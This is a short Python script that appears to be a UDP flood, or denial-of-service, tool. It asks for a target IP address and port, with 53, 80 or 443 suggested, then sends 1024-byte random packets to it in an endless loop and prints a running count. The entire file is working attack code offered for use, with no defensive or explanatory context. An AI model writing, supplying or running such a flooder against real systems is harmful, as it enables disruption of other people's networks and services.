import socket
import random
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip = input("TARGET IP :") #Ex 192.168.1.2
port = int(input('Port :')) #53 80 or 443
sent = 0
while True:
    sock.sendto(bytes,(ip,port))
    print("Sent %s amount of packets to %s at port %s."%(sent,ip,port))
    sent = sent+1
